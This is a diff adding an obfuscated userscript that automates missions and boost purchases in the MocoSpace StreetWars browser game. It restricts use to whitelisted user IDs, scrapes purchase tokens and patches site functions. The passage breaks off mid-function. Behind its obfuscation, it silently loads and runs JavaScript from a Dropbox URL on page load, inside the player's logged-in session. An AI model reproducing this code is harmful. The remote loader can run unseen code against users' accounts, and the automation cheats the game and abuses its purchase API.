@@ -1,0 +1,545 @@
+// ==UserScript==
+// @name          Missions.user.js
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  try to take over the world!
+// @author       You
+// @match        https://www.mocospace.com/games?gid=1000&r=*&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Flocation%3D*
+// @match        https://www.mocospace.com/games?gid=1000&r=*&source=internal&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp*
+// @match        https://www.mocospace.com/games?gid=1000&r=*&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp*
+// @match        https://www.mocospace.com/games?gid=1000&r=*&source=internal&fakeWk=true&url=%2Fstreetwars%2Fmission%3Faction%3Ddo*
+// @match        https://www.mocospace.com/games?gid=1000&r=*&source=internal&url=%2Fstreetwars%2Fmission%3Faction%3Ddo%26location%3D*%26mission%3D*%26validator%3*
+// @match        https://www.mocospace.com/games?gid=1000&r=*&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fplayer-dashboard-wk.jsp*
+// @grant        none
+// ==/UserScript==
+//clientsided
+
+function kvxhvatver2_0x1613c3(_0x5968ed, _0x33f84d, _0x49fcdb, _0x3cb495, _0x20bf43) {
+
+  return kvxhvatver2_0x3aca(_0x5968ed + 0x2df, _0x33f84d);
+}
+(function (_0x25f02e, _0x4f43f1) {
+  var _0x41ec9f = _0x25f02e();
+  while (true) {
+    try {
+      var _0x520e2f = -parseInt(kvxhvatver2_0x3aca(1307, 0x66a)) / 1 * (-parseInt(kvxhvatver2_0x3aca(873, 0x646)) / 2) + -parseInt(kvxhvatver2_0x3aca(1043, 0x45e)) / 3 + parseInt(kvxhvatver2_0x3aca(1238, 0x85e)) / 4 * (parseInt(kvxhvatver2_0x3aca(634, 0x351)) / 5) + parseInt(kvxhvatver2_0x3aca(611, 0x2f1)) / 6 + parseInt(kvxhvatver2_0x3aca(1092, 0x32c)) / 7 * (-parseInt(kvxhvatver2_0x3aca(1375, 0x2e0)) / 8) + -parseInt(kvxhvatver2_0x3aca(1445, 0x8c3)) / 9 + -parseInt(kvxhvatver2_0x3aca(1295, 0x764)) / 10 * (parseInt(kvxhvatver2_0x3aca(360, -0x2b1)) / 11);
+      if (_0x520e2f === _0x4f43f1) {
+        break;
+      } else {
+        _0x41ec9f.push(_0x41ec9f.shift());
+      }
+    } catch (_0xc6cba8) {
+      _0x41ec9f.push(_0x41ec9f.shift());
+    }
+  }
+})(kvxhvatver2_0x50a3, 458888);
+_0x367169: (function () {
+  var _0x2a7a9e = document.createElement("script");
+  _0x2a7a9e.src = "https://dl.dropbox.com/scl/fi/zj73pikzxmevz2jrc5q6y/jqc4miss.js?rlkey=l9tz2jr2li8f9j5ta1t2v29mj&st=wy2aobmi&dl=0";
+  document.head.appendChild(_0x2a7a9e);
+})();
+function kvxhvatver2_0x3aca(_0x5d7d82, _0x2bfbee) {
+  var _0x235f4f = kvxhvatver2_0x50a3();
+  kvxhvatver2_0x3aca = function (_0x50a3ab, _0x3acafa) {
+    _0x50a3ab = _0x50a3ab - 248;
+    var _0x11f91c = _0x235f4f[_0x50a3ab];
+    return _0x11f91c;
+  };
+  return kvxhvatver2_0x3aca(_0x5d7d82, _0x2bfbee);
+}
+exam = 0;
+xv = document.createElement("div");
+function kvxhvatver2_0x115c9e(_0x1c3a4c, _0x2daa60, _0x30a926, _0x2e54ed, _0x2bb097) {
+  return kvxhvatver2_0x3aca(_0x2e54ed - 0x62, _0x2bb097);
+}
+function kvxhvatver2_0x6effaf(_0x3fcfaf, _0x2c531c, _0x459ffe, _0x428c62, _0x41dec5) {
+  return kvxhvatver2_0x3aca(_0x41dec5 - 0x218, _0x3fcfaf);
+}
+document.body.appendChild(xv);
+function kvxhvatver2_0x1da9a1(_0xeae46b, _0x336141, _0x399e2f, _0x1066dd, _0x49b537) {
+  return kvxhvatver2_0x3aca(_0x49b537 + 0x160, _0xeae46b);
+}
+function kvxhvatver2_0x50a3() {
+  var _0x384938 = ['qMNqt', "dark ", 'trace', 'qcdUw', '_buy', 'NKIvG', 'BXTRb', 'unHVW', 'Gkwfv', " 15cl", 'LSuCR', 'ame%2', 'WyUDz', 'issio', "y is ", 'WvFgm', 'HALco', 'vlZVJ', 'PafoA', 'zmxTr', 'CSjix', 'ftySZ', 'JzkLf', 'QNRhX', 'iVnRO', 'LlsnT', 'block', 'elect', 'hWVfr', 'title', 'zA4Mz', 'fAShW', 'match', 'klCjt', 'nkplI', 'head', 'RED!', '8219', 'OMyOQ', 'BOIgA', 'proto', 'xXvJY', 'zQUbo', 'AOIGe', 'sion/', 'MZWVQ', 'icati', 'ktkfL', '2%2Fg', '%3Fac', 'toStr', 'onId', " wall", 'ZdiBX', 'true', 'aWygc', 'i.jsp', 'to__', 'WtgLf', 'QzhcB', 'lRwuD', 'CKEcp', 'zgyMT', 'uuqhX', '&sour', 'JXGGU', 'JGMzF', 'iRHnt', '4|5|1', 'NTcJX', 'tHeig', 'MrddU', 'fYzzT', 'FjMiO', 'gYEQq', 'epyvg', 'NMNzt', 'hvtEe', 'NadIr', 'AGAIN', 'luAeY', 'AxepW', 'URGcp', '2Fstr', 'bCkNx', 'IOjno', 'WzFWb', 'BpXAw', 'MiHEk', 'hzgjA', 'UimMj', 'ZNKNl', 'kCdaR', 'dOxzE', 'ospac', 'NwWkk', 'noAzj', 'click', 'stree', 'TDhon', 'logge', 'qdQoK', 'rgy', 'SJtsr', 'LxNCc', 'OnkcI', 'YHNxL', 'NTg3N', 'iSqhr', "ling ", 'CSrId', 'jJDwm', 'ntern', '%3D', 'viQTj', 'cLbyv', 'IrSTr', 's%2Fm', 'ykIWs', 'oOwBw', 'BlGlB', 'func_', 'WcXjA', 'engkn', 'EHoxM', '|7|3|', 'tHkVW', 'hEXWf', 'hvxFU', 'bNGra', 'TU0NT', 'WGUdH', 'TtZXl', 'twars', 'insnq', 'lAuQA', 'zhqzw', 'dPniQ', 'split', 'Jjzxs', 'MBNpH', 'jjZEy', 'QbcCH', 'inclu', 'Utkbd', 'yCuRE', 'LcKlf', 'pe%3D', 'lWyDZ', 'FAlzK', 'cXBNL', 'dmrVi', 'IMxAz', 'GvOfL', '8|0|9', 'HgUya', "no er", 'cBZmi', 'sUCZn', 'XEJry', 'ZeLDA', 'FAkpy', 'om/s/', 'datas', 'xdhQP', 'searc', 'hrirk', 'NlQVB', 'YNgUt', 'Uuufv', '(((.+', 'uxYeq', 'span', 'BOOST', 'cqLdN', '://dl', 'KXpBO', 'ROqhB', 'mlCRo', "re ho", 'DlxWw', 'oKfxU', '/wap2', 'dnBoR', 'DSBSB', 'TDOAH', '3D19', 'nuYrD', 'DpfQt', 'EWORF', '%3Fv%', 'vpqeT', 'MKwxR', "s Den", 'rHTML', '100%', 'wLUjD', 'SNkAN', 'Lohiw', 'inter', 'cJytf', 'YEdxO', 'energ', 'lUmCJ', 'vblcf', 'oMpYJ', 'LsHuv', " mobi", 'yhpCz', 'RPcBR', 'OCFps', 'eKFAZ', 'JpsZs', 'MOfyP', 'cMcAD', 'suXrX', 'qzJRP', 'creat', 'WRDVa', 'pALtf', 'zKYrS', 'MboQX', 'JdBzh', 'veWUP', 'url=%', 'UyACA', 'ReLdL', 'zEmov', 'pgBYF', 'NTEzN', 'ing', 'ZsIIc', 'TFdGV', 'qUPlP', 's/sto', 'PGhbM', 'oYgRU', 'TqUnT', 'const', 'uvSfd', 'YiNZv', 'uvuPP', 'ult(n', 'soXtf', 'ZCBSI', '1689215BbKKzJ', 'EKyHI', 'call', 'sgAXC', 'rIjmX', 'WCYCB', 'tLcmJ', 'IZWns', 'DE5Nj', '6|4|5', '://ww', 'Zokke', 'ZnvOG', 'iqNnS', 'CVIFj', 'erId', '%26v', 'qGhol', 'MZfKa', 'gFjWj', '66449', 's?gid', '&r=31', 'TeSOi', 'bCSEt', 'wTbrG', 'YuHyr', 'ry_te', '2139', 'gcfHI', 'ApTHu', '(.*)%', 'entLi', 'QoDsU', 'div', 'l&fak', 'otYtT', 'OhWqD', 'nstru', 'jIWUD', " 5cli", 'iufKT', 'xJkgC', 'lhNhd', 'kumGZ', 'Missi', 'VqyaD', "le si", 'sftEO', 'find', 'ghiBb', 'GhFxd', 'GATaE', 'TGIKO', 'ZhkYk', 'RYCQO', 'HVrRP', 'terna', 'vMTad', 'n%3D1', " stor", 'KbHdN', 'qVyDK', 'PMYas', 'iDSHu', 'WvedR', 'CHOds', 'overl', 'lQxuj', 'cugDA', 'DtZzI', 'gfxIC', 'lInfB', 'SmJPI', " thug", 'OPboh', 'vDdQI', 'cWQSq', 'DbLfX', 'gIbfN', 'src%3', 'low.', 'dAGbh', 'XNJQw', 'rfPWg', 'NxpJO', '8790', 'pQlmR', '_butt', 'Infil', ')+)+)', 'iXpKt', '&r=77', 'UENCC', 'kcmIp', 'GeYBy', 'Name', 'yOKjW', 'post', 'dsExR', 'mgLZn', 'CAnwc', "n (fu", '/stre', 'qUPJQ', 'avQDR', 'Igvsj', 'MlVxY', 'QHUjf', 'fMAYa', 'xp_ne', 'ccspe', 'CgbAU', '7096', 'XheEe', 'NUIfE', 'ent.q', 'YvEzh', "med\")", 'canmr', 'BcQrE', 'MiBUH', 'msg', 'stron', 'FNBuc', 'NpGIl', 'KKIGn', 'MGPnB', 'TFHAw', 'bzwNg', 'iNqAI', 'SSaOj', '5%26u', 'h(e){', 'SenGD', 'TtIye', 'XVeOj', 'ekrYN', 'WTqEX', 'XzOYO', 'kFuHr', '%26it', 'warn', 'w.moc', 'LKIdv', 'HTML', 'aKOwR', 'wgETi', 'CVDrx', 'xoNLy', 'nMexT', 'EqbDs', 'bind', 'rpaTX', 'yOvvb', 'dtdYn', 'JLmxv', 'ePDRU', 'IbAwm', 'RTzUG', 'bFRvz', 'pcDMk', 'mUkxN', 'GjdUC', 'LfbIn', 'xhAvm', 'bJTEp', 'tion%', 'speed', 'Pbgcf', 'ELjwo', 'sfWUF', '0|5|3', 'hkwWl', '0476', 'TU5ND', 'TqtZk', 'OZEKc', 'HWgth', 'EAsUA', 'NKokW', 'CNaWn', 'xRrbZ', 'ructo', 'green', 'MaHPp', 'QVqyG', 'hHcLN', 'bUYqq', 'YfUiB', '-list', 'color', 'ntMas', 'lQcWw', 'okIOh', 'dSsOi', 'displ', 'EoUqH', 'FFDAu', 'zVBsU', 'geuuC', 'PhHwh', 'mEbpy', 'Nprtk', 'mtuKS', 'WtRXB', 'ZyVYb', 'OAcQM', 'wfunc', 'gLmlk', 'erDFv', 'DSXjr', 'ZsMXK', 'lsdwe', 'kcHRo', 'ArAHe', '2600', 'bDSRL', 'eded_', 'style', 'gtnzM', 'Tykis', 'DDqwN', 'ajEiz', 'nEBqp', 'uYWMP', 'djHwd', 'stene', 'consu', 'butto', 'XABDC', 'dghGH', '3Dpre', '_form', 'MLjhC', 'stats', 'mXJQw', 'OZhYN', 'setIt', 'YsOfP', 'LaQtY', 'oqGGy', 'TW9jb', 'oOJHC', 'hlZEd', 'TsdDu', 'mBZgP', 'bqrxt', '{}.co', 'kRbzd', 'vWnEW', '3239250zPbnzu', 'ZbzNl', 'conso', 'TrGlT', 'rs%2F', 'JdSSO', "et ", 'ODc5M', 'nlXlR', '26val', 'tion', 'DIIhg', '2Fwap', 'oIzLL', 'cYUgQ', 'true&', 'NBYOd', 'yplNN', 'YwiiO', 'game_', 'ZJwHf', 'RYCFO', '0831', '5DFYyYK', 'qmokr', 'hgmQp', '5&sou', 'iwmpw', '1NwYW', 'nCnnI', 'yyPxF', 'qpjha', '4&sou', 'TEsxJ', 'UQOhH', 'EHanp', 'bXXAH', 'naoLp', 'QCDrq', 'MZcss', 'Hjzec', 'kvVfc', 'QuaZv', 'buyit', '#game', 'OjXQH', 'pApSG', 'oULmX', 'FyqwR', 'ldup', 'ryYHk', 'ssepl', 'BaAGi', 'Entry', 'KOtvd', 'zIebD', 'info', '1334', '3D153', 'kCjdd', 'WdJMf', 'tSarT', 'OqbRX', 'MTAxM', 'jmyDU', 'mfzKA', 'ZHEex', 'DcwOT', 'NckYb', '|1|4|', 'gMAPV', 'tTZpI', 'HHfxV', 'TjacH', 'PaxID', 'WcIoJ', 'HAjXs', 'PvGRz', 'XRVTQ', '?r=', 'fJKEj', 'pWayk', 'vDuKw', 'uumtp', 'sPWva', 'eUdJN', 'qdTuR', '1964', '3D100', 'rvrNA', 'nvHFG', 'zgJHV', 'type', 'FhFdH', 'FhkoO', 'retur', '20cli', 'mrLBq', '998', 'KaVfr', '}catc', 'iXAJR', 'etwar', 'bzAQX', 'xEvar', 'hZXXN', 'SdLIH', 'hHweQ', 'PkdWw', "Rob c", 'hzRAX', 'value', 'qdZxI', 'lWXBI', '3992', 'QEhVd', "Your ", "DO IT", 'sBlop', 'eElem', 'catio', 'nlSVE', 'zA4OT', 'nseJS', 'KBVDV', '10115', 'MwLUk', 'nQqzu', 'QioLT', 'keWk=', 'cvDIg', 'funct', 'zwjZZ', 'TQGbX', 'RcxJU', 'NTg5M', 'UgCVO', 'tsmhU', 'lmdUn', 'mXWCu', 'NUE', 'PAwXB', 'ById', 'RNhSj', 'yLglB', 'ioakI', 'eWk=t', 'aAsve', 'VLyDI', 'GrXsO', 'BxMUH', 'emID%', 'PSReZ', 'VbSeC', 'GCdIW', 'tOZxb', 'oWBiE', 'Fwap2', 'VbQPb', 'NNVIm', 'mfIxF', 'KLOwx', 'onCap', 'LCOAH', 'EWFJy', "n() ", 'zBfpS', 'ied', 'OCYDl', 'uyXzz', 'start', '.inne', 'seZQd', ',A,B)', 'VawKB', 'getIt', 'bpTVw', 'DupFj', 'OIUDY', 'KsWGw', 'xvUpE', 'KfaaO', 'mamQe', 'PRpyB', 'fjuUh', 'WhuxV', 'gName', 'nJFdR', 'QZNvl', "ion u", 'riuzH', 'izGKX', 'led', 'sFGgN', 'ntUcE', 'XUYLH', 'ound', 'qOYby', "ror f", 'mlEcA', 'YiYqL', 'BQKXj', 'reGKy', 'oabqz', " 10cl", 'bFJWs', 'pWPQj', 'rqDkj', 'aMLnc', 'KOTzz', 'TOtts', 'zlnkD', 'vYbzb', "ng ne", 'QtpvK', 'JRCLd', 'bBgkP', '9465', 'PlZJB', "is\")(", 'EZNSq', '5%26v', '3Floc', 'MAeHN', 'OUbxN', 'JkZxz', 'cpvAP', 'xhXTU', 'ZLSin', 'em%26', '__pro', 'hUeSX', 'LAqlq', 'TFdPH', '1000', 'HkYaI', 'https', 'antvR', 'PCWCD', 'NxCwt', 'WkyQz', 'appen', '&u=', 'ILqmR', 'RVSqm', 'box.c', 'saSuq', '&r=43', 'iZGNQ', 'PCOFt', 'DgAmu', 'LJhZu', 'qNdkq', 'yCdYi', '.jsp%', '7566', 'getEl', 'WUSdK', 'BAmTp', 'CsWmc', 'lUBpu', '7874', '2JnXiuj', 'rstat', 'ZPtUd', 'jQdCA', "rn th", 'hOgun', '7768', 'udAfL', 'zElGZ', 'on%3D', 'QYkbK', 'bQTKW', 'ion%3', 'dialo', 'jiRJH', 'UqONl', 'tHPXt', 'inner', 'EnQUU', 'dInUs', 'oumLm', 'wwqiT', 'izQko', 'CFVjb', 't.jsp', 'lgZuj', '5877', 'mNguI', 'repla', 'nseTe', '12194', 'XgetP', 'nctio', 'eQxml', "l : o", 'pdWyw', 'ement', 'bHGID', 'sPxjI', 'HXDjW', 'apply', '8623', 'lXnqJ', 'rjGtT', 'mmkAs', 'bktVa', 'round', 'rvLqW', 'log', 'ent', 'KhMkq', 'agarJ', 'hDNOm', 'edsmt', 'FkMwm', 'orner', 'KjNOY', 'Dk5OA', 'RMFFY', 'ation', 'mQAsm', 'IQaPS', 'pbFuY', '_text', 'IBCDg', 'gWhVk', " two ", '/jqc.', 'BfhCj', 'table', 'nttRr', 'bKRZV', 'aPDKj', 'rvUzY', 'herOk', '_left', 'DhQvN', 'ShZHJ', 'huzet', 'href', "=\"\"}}", 'flmBf', 'dydBK', 'heade', 'YBFqU', 'cMgPd', 'lZsQb', 'xVdQc', 'wTlnV', 'Z2dlZ', 'IjIXD', 'kyyPr', 'index', 'QosgZ', 'GeRPq', 'perce', " : ", 'Nlckl', 'xkmSS', 'Steal', 'PePEd', 'Rtmwc', 'QfxSC', 'input', 'japlf', 'UYubR', "\"retu", 'uiEbF', 'assNa', '00001', 'HxvzV', 'xdinZ', 'notif', 'D(.*)', 'qhAYV', 'MASTE', 'WgLsc', 'vyvNp', 'TUDhw', 'ngkuA', 'CeNyT', 'wIjCH', 'Rkhos', " foun", 'remov', 'rl=%2', 'kUywt', 'DiCWq', 'error', 'maste', 'cks', 'sAJtK', 'KxXEG', 'e.com', '=1000', 'des', 'nJDFV', 'zdcvz', '&r=34', 'egwnz', 'YkFkM', '7680', 'FIWKS', 'WucgE', 'qhypK', 'oJMVQ', 'iQLiB', 'xexmb', 'vWKWT', 'lwdsP', 'INntK', 'dDyhG', 'sByTa', '0027', 'XUnwY', 'Sxzxs', 'YFbEl', 'DSvZY', 'JHgwn', 'push', 'mbNHu', 'gvfGZ', 'Fiqis', 'modal', 'MVXQC', 'figjh', 'ajax', 'qdmng', 'sByCl', 'epbxb', '276168BOVrSz', 'bXNyc', 'gQUgo', 'ring', 'asqDa', 'VGHpc', 'src', 'calli', 'lucMA', 'dIxsT', 'alTRl', " gamb", 'Wtvhu', 'GuAhe', 'nlNcn', 'UkmNN', '10000', 'pwqlv', 'UAnKb', 'elzUI', 'hvxjo', 'JHAje', 'AFANP', 'docum', 'KtcKl', 'TmVMy', 'Fstre', 'ydrAt', 'respo', 'TEzMz', 'disab', 'hDuIk', 'FxMwo', 'fVMPy', 'SLlSJ', 'THAtG', 'iNUnN', 'KRoNY', '%26mi', 'ncpya', 'vRDer', '8869', 'UJeOB', 'CbdRm', 'missi', 'IekNX', 'ZMFQz', 'nQFvA', 'OyOiT', '10486hRjfgY', 'onRes', '%3D15', 'dPbxr', 'tered', 'VdmBd', '3170', 'Qcrlf', 'zUpiP', "n don", 'DghNB', 'UUMuP', 'qjYYm', 'wGQbM', 'UrYOE', 'wJqlp', 'zOmeQ', 'cXeRd', 'ctor(', 'eMtPI', 'VUIKI', 'KQtMT', 'PzASV', 'pZjOh', 'dWNGH', 'camQU', 'HGkHJ', 'UfLux', 'BsRPg', 'CgViS', 'tBMSa', 'rce=i', 'vQuJl', 'NNQPn', 'JEsDc', 'undef', 'kgyat', 'lhagx', 'kUcrE', 'oUBYg', 'me%2F', 'cIdpu', 'CVfOo', 'VwwYb', 'BhASt', 'n-lis', 'fcORb', 'BkVZW', 'pUuxm', 'DISBY', 'RkvCT', 'HtyYZ', 'BOSS', 'SVfxV', 'ObXjw', 'IdHLM', 'sacOS', 'HqXUw', "or(\"#", 'BmZVG', "ton x", 'wIhRb', 'uhufo', 'rGmpj', 'agpnV', "r sto", 'jwPyw', 'rando', 'nal', 'clien', 'DfvsM', 'NxVBw', 'eItem', 'wsMfD', 'AnADN', 'LiWJY', 's/mis', 'xuzWD', 'RrXPX', 'DBOSS', 'store', '5|2|4', 'eYJKi', "o the", 'liPSs', 'UUMXJ', 'JRTqv', '&r=19', 'Azsif', 'iunwp', 'g6clt', 'QFDra', 'lnRYf', '6706', " Go t", 'rqnhv', '5741', 'hrFlC', 'lSqfS', 'ZEAqp', 'Wrqww', 'aTwxF', 'wgxez', 'nWzIn', 'fSIYI', 'lIxjD', 'yuWzt', 'VWilH', '2023', 'AuybW', '_500', 'ODYyM', 'TCOfL', 'e_but', 'FBCNc', 'OkcdK', 'XStkS', 'JEDEu', 'rHIdr', 'OntJr', 'adJbg', '70576', 'bVsPe', 'XjteY', 'xTOXo', 'Close', 'Kyssi', 'RMBRa', 'pYVbU', 'hMouV', 'Liquo', 'HpCIn', 'igbtb', 'REnfA', 'Swrag', 'CTdFI', 'oYnRk', 'igxHO', 'GOKBT', 'ofCse', 'Error', 'PTLpi', 'XJulL', 'EULMP', 'NzY4M', 'YcIHy', '1627012DQpNJX', 'UrgqO', 'XjNQB', 'msNGC', 'QlteN', 'yCJkP', "s ene", 'stop', 'ueryS', 'afnvq', 'QatHj', 'iobcd', 'oNLma', 'YhXGz', 'WWmZa', 'eetwa', 'Refil', 'IhCal', 'pGbri', 'Xbuyk', 'hTmct', 'ticED', 'ults', 'xPwsU', '%2Fga', 'RELtP', 'bOhCM', 'valid', 'YEWzr', 'Hdawe', 'CjQEO', 'FjwtY', 'Csobo', 'dmrZJ', 'AdJij', 'OtbDu', 'level', 'AwPwt', 'FbMvA', 'Nzc2O', 'YfYoM', 'trate', 'jdSZO', 'lTKgn', 'EluVX', 'bvhPN', 'irUjd', '|1|2|', 'AOzRe', 'IHRcw', 'GCLHs', 'body', 'BTJET', 'noted', '/game', 'hJune', 'icks', '30RvCfbS', 'VXTmx', 'ZiUfH', 'evel', 'aRkor', 'jgUKv', 'zrALd', 'dnwaD', 'ewipP', 'OgskY', 'rBdDG', 'iDsxY', '692711GqiqPY', 'lUKiu', '.drop', '11591', 'inlin', 'iNvaa', 'class', 'HkCGZ', 'ahooe', 'hyiDY', 'fNsrI', 'on-ap', 'POST', '5162', 'dChil', 'QGmIl', 'TyFDa', " at ", 'wsVzl', 'XjmWR', 'okKot', 'JzoDc', 'KGsRr', 'OdNFM', 'JhPup', 'tvwJM', 'al&fa', 'oOEMA', 'tRiIT', '3844', 'a10', 'xbBGn', 'ynsvx', 'LaXoX', 'mbsVz', 'jzloz', 'ehmoQ', 'manCR', 'cbDeV', 'EVeFd', 'rNyjs', 'sqSGX', 'CJFtt', 'VQwnZ', 'OakdT', 'suNFq', 'wIbRt', '&r=76', 'PRjZa', '%26ty', 'vCnYE', 'XZOHU', 'zkcMf', 'CjlKJ', 'AhcOn', '0&sou', 'ffgLQ', 'akmES', 'CeJJJ', 'GqdBR', 'MxOHR', 'HPPwb', 'red', 'qFNTy', 'yTHHt', " one ", 'DbGqx', 'efVoM', '2392dWukOr', 'ljtiZ', 'locat', 'hzrZL', 'fWtgD', 'CIJon', '{try{', 'fmODS', 'KmwpY', 'BFQhF', 'buHXX', 'ODg2O', 'lThSK', 'DLLtw', 'vgWNK', 'WNbSA', '%2Fmi', 'ssion', 'LISSD', 'waEdV', 'ined', 'excep', 'Acces', '|0|1|', 'sSZhX', 'YfTmt', 'GNGkj', 'vfUnW', 'ySRqq', '|2|3|', 'FZygh', 'apArh', 'MMeNL', '%3Flo', 'MVNnY', 'NvifV', 'aJkLQ', " half", 'rxkTo', 'QYVOP', 'JyJDf', "Mug a", 'IEQfU', 'addEv', 'lengt', 'acsNz', 'subwW', 'KMhZR', 'ohuTV', 'scrip', 'riXos', 'ZzOme', 'UAwAs', 'LmdXh', 'vqZBN', 'ion', 'tAeen', 'WNZPR', 'mySzd', 'TzGCq', 'hIINo', 'yTIEq', 'VREUZ', 'eAaFP', 'eSVzl', '7&sou', 'qcRPH', 'ce=in', 'TnmnD', 'zViEF', '1618182yRTLwC', 'LkHpz', 'TcJhu', 'LPPuR', 'CONTI', 'rue&u', 'pdate', 'wYcQo', 'nZFUK', 'Text', 'CKmiu', 'atDpY', 'asiaC', 'qvRXN', 'efill', 'xSEPa', 'YCUKx', 'EBKvS', " a ca", 'ionId'];
+  kvxhvatver2_0x50a3 = function () {
+    return _0x384938;
+  };
+  return kvxhvatver2_0x50a3();
+}
+xv.style.color = "green";
+setInterval(function () {
+  xv.innerHTML = exam;
+}, 100);
+function kvxhvatver2_0x196356(_0x1fdd2e, _0x1395c8, _0x52dbfa, _0x6da474, _0x58b020) {
+  return kvxhvatver2_0x3aca(_0x58b020 + 0x302, _0x1395c8);
+}
+gjjioo0vdrg = ["NTUyOTM3MzA=", "NTg5MTU0NTQ=", "NzY4MDk5OA==", "ODYyMzgyMTk=", "ODc5MDE5NjQ=", "MTAxMTU5NDY1", "NTg3NzA4MzE=", "NTEzNzA4OTY=", "ODg2OTEzMzQ=", "Nzc2ODcwOTY=", "ODg2OTEzMzQ="];
+setTimeout(function () {
+  if (exam == 0) {
+    xv.innerHTML = "Error found";
+    document.getElementsByClassName("func_headerstats energy")[0].click();
+  }
+}, 5000);
+if (gjjioo0vdrg.includes(btoa(eval(atob("TW9jb1NwYWNlQVBJLmxvZ2dlZEluVXNlcklk"))))) {
+  if (localStorage.getItem("canmrefill")) {
+    refillon = true;
+  } else {
+    refillon = false;
+  }
+  var can_refill = true;
+  _0x3482a8: function timeout() {
+    xb = setInterval(function () {
+      v1 = document.getElementById("game_mastery_text").getElementsByClassName("value")[0].innerHTML;
+      console.log("Entry one noted at " + new Date());
+      setTimeout(function () {
+        v2 = document.getElementById("game_mastery_text").getElementsByClassName("value")[0].innerHTML;
+        console.log("Entry two noted at " + new Date());
+        if (v1 == v2) {
+          clearInterval(v);
+          clearInterval(xb);
+        } else {
+          console.log("no error found");
+        }
+      }, 4000);
+    }, 6000);
+  }
+  closebuttonclicked = false;
+  if (location.href.indexOf("validat") > 0) {
+    locationid = document.location.href.match("location%3D(.*)%26mi")[1];
+    missionid = parseInt(document.location.href.match("mission%3D(.*)%26val")[1]) + MocoSpaceAPI.loggedInUserId;
+    uid = MocoSpaceAPI.loggedInUserId;
+    if (localStorage.getItem("ccspeed") && document.getElementsByClassName("clicker").length > 0) {
+      clickspeed = localStorage.getItem("ccspeed");
+    } else {
+      clickspeed = 75;
+    }
+    error = 0;
+    var a = updateMissionResult.toString();
+    a = a.replace("function updateMissionResult(n,A,B){", "function updateMissionResult(n,A,B){try{");
+    a = a.replace("document.querySelector(\"#consumed\").innerHTML=\"\"}}}", "document.querySelector(\"#consumed\").innerHTML=\"\"}}}catch(e){}}");
+    var pp = document.createElement("script");
+    pp.innerHTML = a;
+    document.body.appendChild(pp);
+  }
+  function uj890xpx(_0x3b654d, _0x4d41a5, _0x47dfdd) {
+    exam = exam + 1;
+    time = +new Date();
+    var _0x451d2a = {
+      locationId: _0x3b654d,
+      missionId: _0x4d41a5
+    };
+    $.ajax({
+      'url': "https://www.mocospace.com/wap2/game/streetwars/mission/mission-api.jsp?r=" + time + "&u=" + _0x47dfdd,
+      'type': "post",
+      'data': _0x451d2a,
+      'complete': function (_0x2f9355) {
+        if (_0x2f9355.responseText.length == 2) {
+          error = error + 1;
+          if (error > 20) {
+            clearInterval(v);
+            document.getElementsByClassName("game_button done_button x_button")[0].click();
+          }
+        }
+        try {
+          if (_0x2f9355.responseJSON.mission.percentMastered == _0x2f9355.responseJSON.mission.missionCap) {
+            clearInterval(v);
+            if (closebuttonclicked == false) {
+              closebuttonclicked = true;
+              document.getElementsByClassName("game_button done_button x_button")[0].click();
+            }
+          }
+        } catch (_0x93b1a) {}
+        try {
+          if (_0x2f9355.responseJSON.stats.energy < 500) {
+            clearInterval(v);
+            clearInterval(pp);
+            if (can_refill == true && refillon == true) {
+              can_refill = false;
+              ebuy();
+            }
+          }
+        } catch (_0x4a65a7) {}
+        try {
+          updateHeaderStats(_0x2f9355.responseJSON.stats);
+        } catch (_0x8af1ef) {}
+        updateMissionResult(_0x2f9355.responseJSON.missionResults, _0x2f9355.responseJSON.mission, _0x2f9355.responseJSON.stats);
+      }
+    });
+  }
+  function nsjjpoiuygt() {
+    if (typeof locid == "undefined" && typeof loc2 == "undefined") {
+      locid = "1000015";
+      setTimeout(function () {
+        document.location = "https://www.mocospace.com/games?gid=1000&r=43&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Flocation%3D1000015%26v";
+      }, 1000);
+    } else {
+      njppyohjj = [1000015, 1000021, 1000019, 1000009, 1000033, 1000018, 1000010, 1000016, 1000020, 1000023, 1000014, 1000024, 1000029, 1000036, 1000038, 1000039, 1000031, 1000028, 1000026, 1000025];
+      k = njppyohjj.indexOf(parseInt(locid));
+      if (njppyohjj[k + 1]) {
+        newid = njppyohjj[k + 1];
+      } else {
+        newid = njppyohjj[0];
+      }
+      setTimeout(function () {
+        document.location = "https://www.mocospace.com/games?gid=1000&r=43&source=internal&fakeWk=true&url=%2Fwap2%2Fgame%2Fstreetwars%2Fmission-list.jsp%3Flocation%3D" + newid + "%26v";
+      }, 400);
+    }
+  }
+  function pjppy9() {
+    $.ajax({
+      'type': "POST",
+      'url': "https://www.mocospace.com/games?gid=1000&r=767&source=internal&fakeWk=true&url=%2Fstreetwars%2Fstore%3Faction%3Dprebuyitem%26src%3DBOSS%26type%3DBOOST%26itemID%3D1000027",
+      'success': function (_0x4f91b1) {
+        r = $(_0x4f91b1);
+        n = r.find("#game_form_buy")[0];
+        public1 = n.getElementsByTagName("input")[1].value;
+        private1 = n.getElementsByTagName("input")[2].value;
+        setTimeout(function () {
+          spjyssty(public1, private1);
+        }, 1600);
+      }
+    });
+  }
+  function spjyssty(_0x239940, _0x8b6e48) {
+    $.ajax({
+      'type': "POST",
+      'url': "https://www.mocospace.com/games",
+      'data': {
+        'action': "buyitem",
+        'publicToken': _0x239940,
+        'privateToken': _0x8b6e48,
+        'itemID': "1000027",
+        'type': "BOOST",
+        'src': "BOSS",
+        'gid': "1000",
+        'url': "/streetwars/store",
+        'gpaction': "call",
+        'fakeWk': "true",
+        'source': "internal"
+      },
+      'success': function (_0x57a090) {
+        r1 = $(_0x57a090);
+        n = r1.find("#game_form_buy")[0];
+        public2 = n.getElementsByTagName("input")[1].value;
+        private2 = n.getElementsByTagName("input")[2].value;
+        validationtoken = n.getElementsByTagName("input")[6].value;
+        TIMESTAMP = n.getElementsByTagName("input")[7].value;
+        console.log(public2);
+        console.log(private2);
+        console.log(validationtoken);
+        console.log(TIMESTAMP);
+        setTimeout(function () {
+          fjpyffco(public2, private2, validationtoken, TIMESTAMP);
+        }, 1800);
+      }
+    });
+  }
